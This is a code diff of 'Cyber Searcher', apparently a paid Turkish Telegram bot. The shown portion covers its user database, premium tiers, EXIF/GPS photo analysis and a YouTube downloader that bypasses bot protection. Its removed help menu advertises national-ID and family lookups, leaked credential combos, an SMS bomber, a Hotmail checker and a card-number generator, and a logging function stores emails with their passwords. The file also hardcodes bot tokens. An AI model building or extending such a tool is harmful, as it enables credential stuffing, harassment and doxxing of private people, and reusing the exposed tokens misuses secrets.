@@ -1,9 +1,9 @@
 # -*- coding: utf-8 -*-
 # ╔══════════════════════════════════════════════════════════╗
-# ║         CYBER SEARCHER v4.0 — FULL PRODUCTION           ║
+# ║         CYBER SEARCHER v4.2 — FULL PRODUCTION           ║
 # ║              Developer: @hackledin                       ║
+# ║  🎵 Müzik + 🎥 Video (POT ile Bot Koruması Aşıldı)      ║
 # ╚══════════════════════════════════════════════════════════╝
-
 import telebot
 import requests
 import os
@@ -23,8 +23,8 @@ from random import choice, randint
 from string import ascii_lowercase
 from urllib.parse import quote
 from telebot.types import (
-    InlineKeyboardMarkup, InlineKeyboardButton,
-    ReplyKeyboardMarkup, KeyboardButton, LabeledPrice
+InlineKeyboardMarkup, InlineKeyboardButton,
+ReplyKeyboardMarkup, KeyboardButton, LabeledPrice
 )
 from yt_dlp import YoutubeDL
 import yt_dlp
@@ -46,40 +46,62 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 # ══════════════════════════════════════════════════════════════
 #  CONFIGURATION
 # ══════════════════════════════════════════════════════════════
-BOT_TOKEN     = "7885601619:AAFiz7kr-TCCuLK6N0gChRBerlJW71oH4og"
+BOT_TOKEN     = "7885601619:AAG2mY41XOx6fGwK8tw4Co-RKrC1WIZnkws"
 ADMIN_ID      = 8573809926
 DB_PATH       = "cyber_searcher.db"
 BOT_REGISTRY_FILE = "bot_registry.json"
-
 PREMIUM_PRICE = 400
 OSINT_PRICE = 200
-
 FREE_CHECK_LIMIT = 3000
 PREMIUM_CHECK_LIMIT = 999999
 FREE_CAPTURE_LIMIT = 3
 PREMIUM_CAPTURE_LIMIT = 999
 FREE_KEYWORD_LIMIT = 3
 PREMIUM_KEYWORD_LIMIT = 999
+SMS_COUNT = 41
+
+# ══════════════════════════════════════════════════════════════
+#  YT-DLP POT (Proof-of-Origin Token) PROVIDER AYARI
+# ══════════════════════════════════════════════════════════════
+# Dockerfile'da çalışan POT sunucusu adresi
+POT_PROVIDER_URL = "http://127.0.0.1:4416"
+
+def _ytdlp_common_opts():
+    """Tüm yt-dlp çağrılarında kullanılacak ortak ayarlar."""
+    return {
+        'noplaylist': True,
+        'quiet': True,
+        'no_warnings': True,
+        'socket_timeout': 30,
+        'retries': 3,
+        'fragment_retries': 3,
+        'ignoreerrors': False,
+        # POT sağlayıcı ayarları (bot kontrolünü aşar)
+        'extractor_args': {
+            'youtubepot-bgutilhttp': {
+                'base_url': [POT_PROVIDER_URL]
+            }
+        },
+    }
 
 # ══════════════════════════════════════════════════════════════
 #  DATABASE FUNCTIONS
 # ══════════════════════════════════════════════════════════════
-
 def db_init():
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     c.execute('''CREATE TABLE IF NOT EXISTS users (
-        user_id INTEGER PRIMARY KEY, 
-        username TEXT DEFAULT '', 
+        user_id INTEGER PRIMARY KEY,
+        username TEXT DEFAULT '',
         first_name TEXT DEFAULT '',
-        join_date TEXT DEFAULT '', 
-        total_checks INTEGER DEFAULT 0, 
+        join_date TEXT DEFAULT '',
+        total_checks INTEGER DEFAULT 0,
         total_combos INTEGER DEFAULT 0,
         is_premium INTEGER DEFAULT 0,
         is_premium_osint INTEGER DEFAULT 0,
         premium_date TEXT DEFAULT '',
         premium_osint_date TEXT DEFAULT '',
-        language TEXT DEFAULT 'tr', 
+        language TEXT DEFAULT 'tr',
         api_pref INTEGER DEFAULT 0,
         keywords TEXT DEFAULT 'tiktok,instagram,netflix',
         is_banned INTEGER DEFAULT 0,
@@ -87,11 +109,11 @@ def db_init():
         capture_used INTEGER DEFAULT 0
     )''')
     c.execute('''CREATE TABLE IF NOT EXISTS premium_logs (
-        id INTEGER PRIMARY KEY AUTOINCREMENT, 
-        user_id INTEGER, 
-        username TEXT, 
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        user_id INTEGER,
+        username TEXT,
         package TEXT,
-        amount INTEGER, 
+        amount INTEGER,
         date TEXT
     )''')
     c.execute('''CREATE TABLE IF NOT EXISTS daily_usage (
@@ -116,7 +138,6 @@ def db_init():
 
 db_init()
 
-
 def db_get(user_id, col):
     try:
         conn = sqlite3.connect(DB_PATH)
@@ -128,7 +149,6 @@ def db_get(user_id, col):
     except:
         return None
 
-
 def db_set(user_id, col, val):
     try:
         conn = sqlite3.connect(DB_PATH)
@@ -138,7 +158,6 @@ def db_set(user_id, col, val):
         conn.close()
     except:
         pass
-
 
 def add_user(user_id, username="", first_name=""):
     try:
@@ -151,13 +170,11 @@ def add_user(user_id, username="", first_name=""):
     except:
         pass
 
-
 def is_premium(user_id):
     try:
         return db_get(user_id, "is_premium") == 1
     except:
         return False
-
 
 def is_premium_osint(user_id):
     try:
@@ -165,13 +182,11 @@ def is_premium_osint(user_id):
     except:
         return False
 
-
 def is_banned(user_id):
     try:
         return db_get(user_id, "is_banned") == 1
     except:
         return False
-
 
 def get_ban_reason(user_id):
     try:
@@ -179,7 +194,6 @@ def get_ban_reason(user_id):
         return reason or "Belirtilmemiş"
     except:
         return "Belirtilmemiş"
-
 
 def set_premium(user_id, username=""):
     try:
@@ -197,7 +211,6 @@ def set_premium(user_id, username=""):
         print(f"[PREMIUM ERROR] set_premium: {e}")
         return False
 
-
 def set_premium_osint(user_id, username=""):
     try:
         conn = sqlite3.connect(DB_PATH)
@@ -214,16 +227,13 @@ def set_premium_osint(user_id, username=""):
         print(f"[PREMIUM ERROR] set_premium_osint: {e}")
         return False
 
-
 def remove_premium(user_id):
     db_set(user_id, "is_premium", 0)
     db_set(user_id, "premium_date", "")
 
-
 def remove_premium_osint(user_id):
     db_set(user_id, "is_premium_osint", 0)
     db_set(user_id, "premium_osint_date", "")
-
 
 def get_user_stats(user_id):
     try:
@@ -236,7 +246,6 @@ def get_user_stats(user_id):
     except:
         return None
 
-
 def get_user_name(user_id):
     name = db_get(user_id, "first_name")
     if name:
@@ -245,7 +254,6 @@ def get_user_name(user_id):
     if username:
         return f"@{username}"
     return str(user_id)
-
 
 def get_user_keywords(user_id):
     try:
@@ -256,10 +264,8 @@ def get_user_keywords(user_id):
     except:
         return ["tiktok", "instagram", "netflix"]
 
-
 def set_user_keywords(user_id, keywords_list):
     db_set(user_id, "keywords", ','.join(keywords_list))
-
 
 def can_add_keyword(user_id):
     keywords = get_user_keywords(user_id)
@@ -267,12 +273,10 @@ def can_add_keyword(user_id):
         return len(keywords) < PREMIUM_KEYWORD_LIMIT
     return len(keywords) < FREE_KEYWORD_LIMIT
 
-
 def get_keyword_limit_text(user_id):
     if is_premium(user_id):
-        return f"♾️ Sınırsız"
+        return "♾️ Sınırsız"
     return f"{FREE_KEYWORD_LIMIT}"
-
 
 def get_capture_used(user_id):
     try:
@@ -280,23 +284,19 @@ def get_capture_used(user_id):
     except:
         return 0
 
-
 def increment_capture_used(user_id):
     current = get_capture_used(user_id)
     db_set(user_id, "capture_used", current + 1)
-
 
 def can_use_capture(user_id):
     if is_premium(user_id):
         return True
     return get_capture_used(user_id) < FREE_CAPTURE_LIMIT
 
-
 def get_capture_limit_text(user_id):
     if is_premium(user_id):
-        return f"♾️ Sınırsız"
+        return "♾️ Sınırsız"
     return f"{FREE_CAPTURE_LIMIT - get_capture_used(user_id)}"
-
 
 def get_daily_usage(user_id):
     today = datetime.now().strftime("%Y-%m-%d")
@@ -312,7 +312,6 @@ def get_daily_usage(user_id):
     except:
         return {"checks": 0, "hits": 0}
 
-
 def update_daily_usage(user_id, checks=0, hits=0):
     today = datetime.now().strftime("%Y-%m-%d")
     try:
@@ -326,7 +325,6 @@ def update_daily_usage(user_id, checks=0, hits=0):
     except:
         pass
 
-
 def save_hotmail_log(user_id, username, email, password, status, detail=""):
     try:
         conn = sqlite3.connect(DB_PATH)
@@ -339,7 +337,6 @@ def save_hotmail_log(user_id, username, email, password, status, detail=""):
     except:
         pass
 
-
 def get_hotmail_logs(limit=50):
     try:
         conn = sqlite3.connect(DB_PATH)
@@ -350,7 +347,6 @@ def get_hotmail_logs(limit=50):
         return r
     except:
         return []
-
 
 def get_bot_stats():
     try:
@@ -363,7 +359,6 @@ def get_bot_stats():
     except:
         return (0, 0, 0, 0, 0)
 
-
 def get_all_users():
     try:
         conn = sqlite3.connect(DB_PATH)
@@ -374,7 +369,6 @@ def get_all_users():
         return r
     except:
         return []
-
 
 def find_user_by_username(username):
     try:
@@ -387,7 +381,6 @@ def find_user_by_username(username):
     except:
         return None
 
-
 def get_premium_logs(limit=20):
     try:
         conn = sqlite3.connect(DB_PATH)
@@ -399,7 +392,6 @@ def get_premium_logs(limit=20):
     except:
         return []
 
-
 def update_stats(user_id, combos):
     try:
         conn = sqlite3.connect(DB_PATH)
@@ -410,16 +402,13 @@ def update_stats(user_id, combos):
     except:
         pass
 
-
 def ban_user(user_id, reason="Kural ihlali"):
     db_set(user_id, "is_banned", 1)
     db_set(user_id, "ban_reason", reason)
 
-
 def unban_user(user_id):
     db_set(user_id, "is_banned", 0)
     db_set(user_id, "ban_reason", "")
-
 
 def get_banned_users():
     try:
@@ -432,7 +421,6 @@ def get_banned_users():
     except:
         return []
 
-
 def api_pref(user_id):
     try:
         v = db_get(user_id, "api_pref")
@@ -440,204 +428,9 @@ def api_pref(user_id):
     except:
         return 0
 
-
 # ══════════════════════════════════════════════════════════════
-#  LANGUAGE HELPERS
+#  📸 EXIF METADATA MODÜLÜ
 # ══════════════════════════════════════════════════════════════
-
-def lang(user_id):
-    l = db_get(user_id, "language")
-    return l if l in ("tr", "en", "ar") else "tr"
-
-
-def s(user_id, key, **kw):
-    l = lang(user_id)
-    txt = S.get(l, S["tr"]).get(key, key)
-    return txt.format(**kw) if kw else txt
-
-
-def get_help_content(uid):
-    """Yardım menüsü içeriğini kullanıcıya özel oluşturur."""
-    l = lang(uid)
-    status = "⭐ PREMIUM" if is_premium(uid) else "🆓 Ücretsiz"
-
-    if l == "tr":
-        return (
-            "📖 **YARDIM MENÜSÜ**\n"
-            f"📌 Durumunuz: {status}\n"
-            "══════════════════════\n\n"
-            "🔹 **SORGU SİSTEMLERİ** (🆓 ÜCRETSİZ):\n"
-            "   • 🆔 TC Sorgu\n"
-            "   • 🔍 TC Pro Sorgu\n"
-            "   • 👤 Ad Soyad Sorgu\n"
-            "   • 👨‍👩‍👧 Aile Sorgu\n"
-            "   • 👨‍👩‍👧‍👦 Aile Pro Sorgu\n"
-            "   • 🌳 Sülale Sorgu\n"
-            "   • 📱 TC'den GSM\n"
-            "   • 📞 GSM'den TC\n"
-            "   • 🚗 Plaka Sorgu\n"
-            "   • 🎓 E-Okul Sorgu\n"
-            "   • 🏠 Tapu Sorgu\n"
-            "   • 🗺️ Ada Parsel Sorgu\n\n"
-            "🔹 **⭐ PREMIUM PAKETLER:**\n"
-            "   • 🌟 Premium (400 Yıldız) → Sınırsız Hotmail + Capture + Keyword\n"
-            "   • 🌍 OSINT Premium (200 Yıldız) → LeakSights OSINT (30+ Sorgu)\n"
-            "   • /premium ile satın alabilirsin\n\n"
-            "🔹 **DİĞER ARAÇLAR** (🆓 ÜCRETSİZ):\n"
-            "   • 📦 Combo Çekme\n"
-            "   • 🎥 Video İndirme\n"
-            "   • 🎵 Müzik İndirme (MP3)\n"
-            "   • 💳 CC Generator\n"
-            "   • 🤖 Discord Token Kontrol\n"
-            "   • ✈️ Telegram Token Kontrol\n"
-            "   • 🌐 IP Bilgi\n"
-            "   • 🔎 DNS Sorgu\n"
-            "   • ⚽ Bahis Sorgu\n"
-            "   • 💊 Eczane Sorgu\n"
-            "   • 🛡️ Proxy Check\n"
-            "   • 🔍 URL Scan\n"
-            "   • 🐍 PHP→Python Çevirici\n"
-            "   • 💣 SMS Bomber - 41+ Servis ✅\n"
-            "   • 📧 Hotmail Checker - Free 3000 satır\n"
-            "   • 📸 Capture Tool - Free 3 kullanım\n"
-            "   • 📸 EXIF Metadata Analizi ✅\n"
-            "   • 🌍 LeakSights OSINT - Premium (200⭐)\n\n"
-            "🔹 **PROFİL:**\n"
-            "   • 👤 Profil\n"
-            "   • 📊 İstatistik\n"
-            "   • 🏆 Lider Tablosu\n"
-            "   • ⚙️ API Değiştir\n\n"
-            "👨‍💻 coded by: @hackledin"
-        )
-
-    elif l == "en":
-        return (
-            "📖 **HELP MENU**\n"
-            f"📌 Your Status: {status}\n"
-            "══════════════════════\n\n"
-            "🔹 **⭐ PREMIUM PACKAGES:**\n"
-            "   • 🌟 Premium (400 Stars) → Unlimited Hotmail + Capture + Keyword\n"
-            "   • 🌍 OSINT Premium (200 Stars) → LeakSights OSINT (30+ Queries)\n\n"
-            "🔹 **OTHER TOOLS:**\n"
-            "   • 💣 SMS Bomber - 41+ Services ✅\n"
-            "   • 📧 Hotmail Checker - Free 3000 lines\n"
-            "   • 📸 Capture Tool - Free 3 uses\n"
-            "   • 📸 EXIF Metadata Analysis ✅\n"
-            "   • 🎵 Music Downloader (MP3)\n"
-            "   • 🌍 LeakSights OSINT - Premium (200⭐)\n\n"
-            "👨‍💻 coded by: @hackledin"
-        )
-
-    else:  # ar
-        return (
-            "📖 **قائمة المساعدة**\n"
-            f"📌 حالتك: {status}\n"
-            "══════════════════════\n\n"
-            "🔹 **⭐ باقات البريميوم:**\n"
-            "   • 🌟 بريميوم (400 نجمة) → غير محدود Hotmail + Capture + Keyword\n"
-            "   • 🌍 OSINT بريميوم (200 نجمة) → LeakSights OSINT (30+ استعلام)\n\n"
-            "👨‍💻 coded by: @hackledin"
-        )
-
-
-# ══════════════════════════════════════════════════════════════
-#  STRINGS
-# ══════════════════════════════════════════════════════════════
-
-S = {
-    "tr": {
-        "welcome": "🌟 <b>Cyber Searcher</b>\n\nHoşgeldin, <b>{name}</b>!\n📌 Durum: {status}\n\n🔻 Aşağıdan işlem seç:",
-        "free": "🆓 Ücretsiz",
-        "premium": "⭐ PREMIUM",
-        "select_op": "🛠 Kullanmak istediğin aracı seç:",
-        "combo_ask": "🌐 Domain gir (Örn: netflix.com) veya (netflix.com 100):",
-        "searching": "🔍 <b>{domain}</b> taranıyor...",
-        "no_result": "❌ {domain} için sonuç bulunamadı.",
-        "combo_caption": "✅ <b>{domain}</b> | <b>{count}</b> Hesap\nAPI: {apis}",
-        "stats_title": "📊 <b>İSTATİSTİKLERİN</b>",
-        "profile_title": "👤 <b>PROFİL</b>",
-        "lb_title": "🏆 <b>LİDER TABLOSU</b>",
-        "help_title": "📖 <b>YARDIM MENÜSÜ</b>",
-        "no_stats": "📊 Henüz hiç sorgu yapmadınız!",
-        "api_title": "⚙️ <b>API DEĞİŞTİR</b>\n\n📌 Mevcut: <b>{cur}</b>\n\nBir API seç:",
-        "api_set": "✅ API → <b>{api}</b>",
-        "lang_pick": "🌍 Dil seçin / Select language / اختر لغتك",
-        "lang_ok": "✅ Dil seçildi!",
-        "premium_title": "⭐ <b>PREMIUM ÜYELİK</b>",
-        "premium_price_txt": "💰 Fiyat: <b>{price} Telegram Yıldızı</b>",
-        "premium_dur": "♾️ Süre: <b>Sınırsız (Ömür Boyu)</b>",
-        "premium_features": "🎯 <b>PREMIUM ÖZELLİKLER</b>\n   • 📧 Sınırsız Hotmail Check\n   • 📸 Sınırsız Capture (20 Platform)\n   • 🔖 Sınırsız Keyword\n   • 🌍 Sınırsız OSINT (LeakSights)\n   • 📊 Detaylı istatistikler",
-        "osint_price": "💰 OSINT Premium: 200 Yıldız",
-        "already_premium": "⭐ Zaten Premium üyesiniz!",
-        "prem_ok": "🎉 <b>Premium aktif!</b>",
-        "buy_premium_btn": "⭐ Premium Satın Al (400⭐)",
-        "buy_osint_btn": "🌍 OSINT Premium Satın Al (200⭐)",
-        "back_btn": "◀️ Geri",
-        "home_btn": "🏠 Ana Menü",
-        "tools_btn": "🛠 Araçlar",
-        "premium_req": "🔒 Premium gerekli!",
-        "video_ask": "🎥 Video linkini gönder:",
-        "video_wait": "⏳ İndiriliyor...",
-        "video_err": "❌ İndirilemedi:\n<code>{err}</code>",
-        "video_caption": "🎥 <b>{title}</b>\n📦 {size}  ⏱ {dur}s  👤 {upl}",
-        "invalid_link": "❌ Geçerli bir link gir!",
-        "ls_ask": "{icon} <b>LeakSights — {tool}</b>\n\n📥 Sorgu değerini gir:",
-        "ls_caption": "📋 LeakSights ⭐\n🔍 Aranan: <code>{val}</code>\n📅 {date}",
-        "tr_ask": "{prompt}\n\n📌 Sonuç TXT olarak gelir.",
-        "tr_caption": "📋 {tool} Sorgu\n🔍 Param: <code>{param}</code>\n📅 {date}",
-        "processing": "🔄 Sorgulanıyor...",
-        "admin_only": "❌ Bu komut sadece admin içindir!",
-        "no_data": "❌ Veri alınamadı.",
-        "given_ok": "✅ Premium verildi: @{user}",
-        "removed_ok": "✅ Premium kaldırıldı: @{user}",
-        "user_nf": "❌ Kullanıcı bulunamadı!",
-        "enter_val": "Değeri gir:",
-        "invalid_tc": "❌ Geçersiz TC (11 haneli sayı olmalı)!",
-        "invalid_gsm": "❌ Geçersiz GSM (10 haneli)!",
-        "invalid_adsoyad": "❌ Ad ve Soyad gir!",
-        "invalid_adaparsel": "❌ İl,İlçe formatında gir!",
-        "multi_bot_list": "🤖 <b>BOT LİSTESİ</b>",
-        "multi_bot_running": "🟢 Çalışıyor",
-        "multi_bot_stopped": "🔴 Durduruldu",
-        "multi_bot_total": "📊 Toplam: {count} bot",
-        "multi_bot_added": "✅ Bot başlatıldı!\n\n🔑 Token: `{token}`\n👤 Sahip: {owner}\n📌 Durum: 🟢 Çalışıyor",
-        "multi_bot_removed": "✅ Bot durduruldu!\n\n🔑 Token: `{token}`",
-        "multi_bot_not_found": "❌ Token `{token}` bulunamadı!",
-        "multi_bot_exists": "⚠️ Bu token zaten çalışıyor!",
-        "multi_bot_no_bots": "📭 Hiç bot kaydı bulunamadı.",
-        "multi_bot_add_usage": "❌ Kullanım: /addbot BOT_TOKEN\n\nÖrnek: /addbot 8369544888:ABC123...",
-        "addbot_tool": "🤖 Bot Ekle",
-        "announce_title": "📢 <b>ADMIN DUYURU</b>",
-        "announce_sent": "✅ Duyuru gönderildi!",
-        "announce_usage": "❌ Kullanım: /duyuru MESAJ",
-        "announce_no_users": "❌ Gönderilecek kullanıcı bulunamadı.",
-        "announce_failed": "❌ Duyuru gönderilirken hata oluştu.",
-        "php2py": "🐍 PHP'den Python'a Çevirici\n\nBana bir PHP dosyası gönder, Python'a çevireyim.",
-        "php2py_converting": "🔄 Çeviriliyor...",
-        "php2py_done": "✅ Tamamlandı!",
-        "php2py_error": "❌ Çeviri sırasında hata oluştu:\n{err}",
-        "php2py_only": "❌ Sadece PHP dosyası gönder!",
-        "php2py_no_token": "❌ API token alınamadı.",
-    },
-    "en": {
-        "welcome": "🌟 <b>Cyber Searcher</b>\n\nWelcome, <b>{name}</b>!\n📌 Status: {status}\n\n🔻 Select an option:",
-        "free": "🆓 Free",
-        "premium": "⭐ PREMIUM",
-        "osint_price": "💰 OSINT Premium: 200 Stars",
-    },
-    "ar": {
-        "welcome": "🌟 <b>Cyber Searcher</b>\n\nمرحباً، <b>{name}</b>!\n📌 الحالة: {status}\n\n🔻 اختر خياراً:",
-        "free": "🆓 مجاني",
-        "premium": "⭐ بريميوم",
-        "osint_price": "💰 OSINT بريميوم: 200 نجمة",
-    },
-}
-
-
-# ══════════════════════════════════════════════════════════════
-#  EXIF METADATA MODÜLÜ
-# ══════════════════════════════════════════════════════════════
-
 def _exif_koordinat_cevir(deger, ref):
     try:
         d = float(deger[0])
@@ -650,11 +443,9 @@ def _exif_koordinat_cevir(deger, ref):
     except Exception:
         return None
 
-
 def _exif_analiz(dosya_yolu: str) -> tuple:
     if not PIL_AVAILABLE:
         return None, "❌ Pillow kütüphanesi kurulu değil.\nKurmak için: <code>pip install Pillow</code>"
-
     try:
         img = Image.open(dosya_yolu)
         exif_ham = img._getexif()
@@ -663,7 +454,7 @@ def _exif_analiz(dosya_yolu: str) -> tuple:
 
     if not exif_ham:
         return None, (
-            "⚠️ Bu fotoğrafta EXIF verisi bulunamadı.\n\n"
+            "⚠️ Bu fotoğrafta EXIF verisi bulunamadı.\n"
             "<i>Sosyal medyadan indirilmiş fotoğraflarda (WhatsApp, Instagram, Telegram) "
             "EXIF verisi otomatik olarak silinir.</i>"
         )
@@ -683,25 +474,22 @@ def _exif_analiz(dosya_yolu: str) -> tuple:
     marka = str(exif.get("Make", "Bilinmiyor")).strip()
     model = str(exif.get("Model", "Bilinmiyor")).strip()
     yazilim = str(exif.get("Software", "—")).strip()
-
     tarih = (exif.get("DateTimeOriginal")
              or exif.get("DateTime")
              or exif.get("DateTimeDigitized")
              or "Bilinmiyor")
-
     gen = (exif.get("ExifImageWidth") or exif.get("ImageWidth") or img.width)
     yuk = (exif.get("ExifImageHeight") or exif.get("ImageLength") or img.height)
-
     iso = exif.get("ISOSpeedRatings", "—")
     if isinstance(iso, (list, tuple)):
         iso = iso[0] if iso else "—"
-
+    
     diyafram = exif.get("FNumber", None)
     try:
         diyafram = f"f/{float(diyafram):.1f}"
     except Exception:
         diyafram = "—"
-
+        
     obturator = exif.get("ExposureTime", None)
     try:
         ov = float(obturator)
@@ -711,13 +499,13 @@ def _exif_analiz(dosya_yolu: str) -> tuple:
             obturator = f"{ov}s"
     except Exception:
         obturator = "—"
-
+        
     odak = exif.get("FocalLength", None)
     try:
         odak = f"{float(odak):.0f} mm"
     except Exception:
         odak = "—"
-
+        
     flas = exif.get("Flash", None)
     if flas is not None:
         try:
@@ -726,9 +514,9 @@ def _exif_analiz(dosya_yolu: str) -> tuple:
             flas = "—"
     else:
         flas = "—"
-
+        
     lens = exif.get("LensModel") or exif.get("LensMake") or "—"
-
+    
     orientation_map = {
         1: "Normal", 2: "Ayna (Yatay)", 3: "180° Döndürülmüş",
         4: "Ayna (Dikey)", 5: "Ayna + 90° CW", 6: "90° CW",
@@ -739,7 +527,7 @@ def _exif_analiz(dosya_yolu: str) -> tuple:
     enlem = boylam = harita = None
     gps_tarih = None
     gps_altitude = None
-
+    
     if gps:
         enl_r = gps.get("GPSLatitudeRef")
         enl_v = gps.get("GPSLatitude")
@@ -750,7 +538,7 @@ def _exif_analiz(dosya_yolu: str) -> tuple:
             boylam = _exif_koordinat_cevir(boy_v, boy_r)
             if enlem is not None and boylam is not None:
                 harita = f"https://www.google.com/maps?q={enlem},{boylam}"
-
+                
         gps_date = gps.get("GPSDateStamp")
         gps_time = gps.get("GPSTimeStamp")
         if gps_date and gps_time:
@@ -759,7 +547,7 @@ def _exif_analiz(dosya_yolu: str) -> tuple:
                 gps_tarih = f"{gps_date} {h:02d}:{m:02d}:{s:02d} UTC"
             except Exception:
                 gps_tarih = str(gps_date)
-
+                
         alt = gps.get("GPSAltitude")
         alt_ref = gps.get("GPSAltitudeRef", 0)
         if alt is not None:
@@ -794,23 +582,21 @@ def _exif_analiz(dosya_yolu: str) -> tuple:
         "toplam_etiket": len(exif),
     }, None
 
-
 def _exif_mesaj_olustur(d: dict) -> str:
     cihaz = f"{d['marka']} {d['model']}".strip()
     if cihaz.lower() in ("bilinmiyor bilinmiyor", "bilinmiyor", ""):
         cihaz = "Bilinmiyor"
-
+        
     msg = (
         f"📸 <b>EXIF METADATA ANALİZİ</b>\n"
-        f"{'━' * 28}\n\n"
+        f"{'━' * 28}\n"
         f"📱 <b>Cihaz:</b> <code>{cihaz}</code>\n"
         f"🔧 <b>Yazılım:</b> <code>{d['yazilim']}</code>\n"
         f"📅 <b>Çekim Tarihi:</b> <code>{d['tarih']}</code>\n"
     )
-
     if d.get("lens") and d["lens"] != "—":
         msg += f"🔭 <b>Lens:</b> <code>{d['lens']}</code>\n"
-
+        
     msg += (
         f"\n<b>📐 Teknik Detaylar</b>\n"
         f"{'─' * 20}\n"
@@ -821,9 +607,9 @@ def _exif_mesaj_olustur(d: dict) -> str:
         f"🔭 <b>Odak Uzaklığı:</b> <code>{d['odak']}</code>\n"
         f"⚡ <b>Flaş:</b> {d['flas']}\n"
         f"🔄 <b>Yönlendirme:</b> <code>{d['orientation']}</code>\n"
-        f"🏷 <b>Toplam Etiket:</b> <code>{d.get('toplam_etiket', 0)}</code>\n\n"
+        f"🏷 <b>Toplam Etiket:</b> <code>{d.get('toplam_etiket', 0)}</code>\n"
     )
-
+    
     if d["harita"]:
         msg += (
             f"<b>📍 GPS KOORDİNATLARI</b>\n"
@@ -835,24 +621,25 @@ def _exif_mesaj_olustur(d: dict) -> str:
             msg += f"⛰ <b>Rakım:</b> <code>{d['gps_altitude']}</code>\n"
         if d.get("gps_tarih"):
             msg += f"🕐 <b>GPS Zamanı:</b> <code>{d['gps_tarih']}</code>\n"
-        msg += f"🗺 <b>Harita:</b> <a href='{d['harita']}'>Google Maps'te Gör</a>\n\n"
+        msg += f"🗺 <b>Harita:</b> <a href='{d['harita']}'>Google Maps'te Gör</a>\n"
     else:
-        msg += f"📍 <b>GPS:</b> <code>Konum verisi bulunamadı</code>\n\n"
-
-    msg += f"{'━' * 28}\n🤖 <i>Cyber Searcher v4.0 | @hackledin</i>"
+        msg += f"📍 <b>GPS:</b> <code>Konum verisi bulunamadı</code>\n"
+        
+    msg += f"{'━' * 28}\n🤖 <i>Cyber Searcher v4.2 | @hackledin</i>"
     return msg
 
-
 # ══════════════════════════════════════════════════════════════
-#  MÜZİK İNDİRİCİ MODÜLÜ (MP3)
+#  🎵 MÜZİK İNDİRİCİ (POT PROVIDER İLE BOT KORUMASI AŞILIR)
 # ══════════════════════════════════════════════════════════════
+MUSIC_LOCK = threading.Lock()
 
 def _youtube_ara(sorgu: str) -> Optional[str]:
+    """YouTube'da şarkı arar, ilk video URL'sini döndürür."""
     try:
         q = quote(sorgu)
         html = requests.get(
             f"https://www.youtube.com/results?search_query={q}",
-            headers={"User-Agent": "Mozilla/5.0"},
+            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"},
             timeout=15,
             verify=False
         ).text
@@ -864,56 +651,68 @@ def _youtube_ara(sorgu: str) -> Optional[str]:
         print(f"[MUSIC SEARCH ERROR] {e}")
         return None
 
-
 def _muzik_indir(sorgu: str) -> dict:
     if "youtube.com" in sorgu or "youtu.be" in sorgu:
         url = sorgu
     else:
         url = _youtube_ara(sorgu)
-
+        
     if not url:
         return {"ok": False, "error": "❌ Şarkı bulunamadı, farklı bir isim dene."}
 
     os.makedirs("muzikler", exist_ok=True)
+    ffmpeg_available = False
+    try:
+        subprocess.run(["ffmpeg", "-version"], stdout=subprocess.DEVNULL,
+                       stderr=subprocess.DEVNULL, timeout=5)
+        ffmpeg_available = True
+    except Exception:
+        ffmpeg_available = False
 
-    ydl_opts = {
-        'format': 'bestaudio/best',
-        'outtmpl': 'muzikler/%(id)s.%(ext)s',
-        'noplaylist': True,
-        'quiet': True,
-        'no_warnings': True,
-        'max_filesize': 50 * 1024 * 1024,
-        'postprocessors': [{
-            'key': 'FFmpegExtractAudio',
-            'preferredcodec': 'mp3',
-            'preferredquality': '192',
-        }],
-    }
+    if ffmpeg_available:
+        formats = [
+            {'format': 'bestaudio/best', 'postprocessors': [{
+                'key': 'FFmpegExtractAudio',
+                'preferredcodec': 'mp3',
+                'preferredquality': '192',
+            }]},
+        ]
+    else:
+        formats = [
+            {'format': 'bestaudio[ext=m4a]/bestaudio[ext=webm]/bestaudio[ext=opus]/bestaudio/best'},
+        ]
 
+    last_error = None
     info = None
     dosya_adi = None
-
-    try:
-        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
-            info = ydl.extract_info(url, download=True)
-            dosya_adi = ydl.prepare_filename(info)
-
-            base, _ = os.path.splitext(dosya_adi)
-            mp3_path = base + ".mp3"
-
-            if os.path.exists(mp3_path):
-                dosya_adi = mp3_path
-            else:
-                for ext in [".mp3", ".m4a", ".webm", ".ogg", ".opus"]:
+    
+    for opts in formats:
+        try:
+            ydl_opts = _ytdlp_common_opts()
+            ydl_opts.update({
+                'outtmpl': 'muzikler/%(id)s.%(ext)s',
+                'max_filesize': 50 * 1024 * 1024,
+            })
+            ydl_opts.update(opts)
+            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
+                info = ydl.extract_info(url, download=True)
+                dosya_adi = ydl.prepare_filename(info)
+                base, _ = os.path.splitext(dosya_adi)
+                for ext in [".mp3", ".m4a", ".webm", ".opus", ".ogg"]:
                     if os.path.exists(base + ext):
                         dosya_adi = base + ext
                         break
-    except Exception as e:
-        print(f"[MUSIC DL ERROR] {e}")
-        return {"ok": False, "error": f"❌ İndirme hatası: {str(e)[:100]}"}
+                if dosya_adi and os.path.exists(dosya_adi):
+                    break
+                else:
+                    dosya_adi = None
+        except Exception as e:
+            last_error = str(e)
+            print(f"[MUSIC DL FORMAT ERROR] {e}")
+            continue
 
     if not dosya_adi or not os.path.exists(dosya_adi):
-        return {"ok": False, "error": "❌ İndirme başarısız oldu."}
+        return {"ok": False, "error": f"❌ İndirme başarısız: {last_error or 'bilinmeyen hata'}"}
 
     size = os.path.getsize(dosya_adi)
     if size > 50 * 1024 * 1024:
@@ -922,6 +721,13 @@ def _muzik_indir(sorgu: str) -> dict:
         except:
             pass
         return {"ok": False, "error": f"❌ Dosya çok büyük ({size/(1024*1024):.1f}MB). Limit: 50MB."}
+    
+    if size < 1024:
+        try:
+            os.remove(dosya_adi)
+        except:
+            pass
+        return {"ok": False, "error": "❌ İndirilen dosya bozuk (çok küçük)."}
 
     return {
         "ok": True,
@@ -933,10 +739,8 @@ def _muzik_indir(sorgu: str) -> dict:
         "url": url,
     }
 
-
 def _process_music(msg, bot_instance):
     uid = msg.from_user.id
-
     if is_banned(uid):
         bot_instance.reply_to(msg, f"🚫 **YASAKLANDINIZ!**\nSebep: {get_ban_reason(uid)}")
         return
@@ -945,29 +749,27 @@ def _process_music(msg, bot_instance):
